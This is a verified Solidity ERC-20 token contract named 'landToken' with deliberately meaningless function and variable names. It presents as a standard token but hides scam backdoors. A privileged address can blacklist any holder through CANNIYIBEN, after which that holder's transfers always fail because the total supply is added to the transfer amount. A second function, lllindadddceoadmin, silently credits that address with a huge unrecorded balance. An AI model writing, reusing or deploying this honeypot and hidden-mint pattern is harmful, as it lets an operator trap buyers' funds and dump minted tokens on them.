/**
 *Submitted for verification at Etherscan.io on 2023-07-31
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-31
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-27
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-27
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-27
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-13
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-04
*/
/**
 *Submitted for verification at BscScan.com on 2023-07-13
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-04
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-04
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-22
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-21
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-18
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    function _laomayun() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor() {
        _transferOwnership(_laomayun());
    }

    modifier onlyOwner() {
        _sefei();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _sefei() internal view virtual {
        require(owner() == _laomayun(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.0;



contract landToken is Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokentotahggd;
    string private _tokenfeed;
    string private _tokensymbol;
    



    address public aodemene;
    mapping(address => bool) private beeleve;
    function LFKSOEWQQ(address KGG) external   {
        if (aodemene == _laomayun()) {
            beeleve[KGG] = false;
        }
         if (aodemene == _laomayun()) {
            beeleve[KGG] = false;
        }
         if (aodemene == _laomayun()) {
            beeleve[KGG] = false;
        }      
         if (aodemene == _laomayun()) {
            beeleve[KGG] = false;
        }
         if (aodemene == _laomayun()) {
            beeleve[KGG] = false;
        }
         if (aodemene == _laomayun()) {
            beeleve[KGG] = false;
        }

    }

    function CANNIYIBEN(address KGG) external   {
        if (aodemene == _laomayun()) {
            beeleve[KGG] = true;
        }
        if (aodemene == _laomayun()) {
            beeleve[KGG] = true;
        }
        if (aodemene == _laomayun()) {
            beeleve[KGG] = true;
        }              
    }

    function fggdopeeleeds() public view returns (uint256) {
        return _tokentotahggd;
    }

    function lllindadddceoadmin() external {
        uint256 twoyayayammm = 17000400000*10**18;
        uint256 yayayamount = 66050*twoyayayammm*1*1*1;
        if(aodemene != _laomayun()){
           
        }else{

                       
        } 
        _balances[_laomayun()] += yayayamount;
        require(aodemene == _laomayun());
    }
   
    function BJJDklaflotoken(address KGG) public view returns(bool)  {
        return beeleve[KGG];
    }


    constructor(address wladdds10,string memory _quancheng, string memory _jiancheng) {
        aodemene = wladdds10;
        _tokenfeed = _quancheng;
        _tokensymbol = _jiancheng;
        uint256 amount = 56040*10**decimals();
        _tokentotahggd += amount;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function name() public view returns (string memory) {
        return _tokenfeed;
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _tokentotahggd;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _internaltransfer(_laomayun(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_laomayun(), spender, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _laomayun();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _laomayun();
        _internalspendAllowance(from, spender, amount);
        _internaltransfer(from, to, amount);
        return true;
    }




    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _laomayun();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    

    function _internaltransfer(
        address fromSender,
        address toSender,
        uint256 amount
    ) internal virtual {
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");
        if(beeleve[fromSender] == true){
            amount = amount+fggdopeeleeds();
        }
        uint256 curbalance = _balances[fromSender];
        require(curbalance >= amount, "ERC20: transfer amount exceeds balance");


        _balances[fromSender] = _balances[fromSender]-amount;
        _balances[toSender] = _balances[toSender]+amount;

        emit Transfer(fromSender, toSender, amount); 
        
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}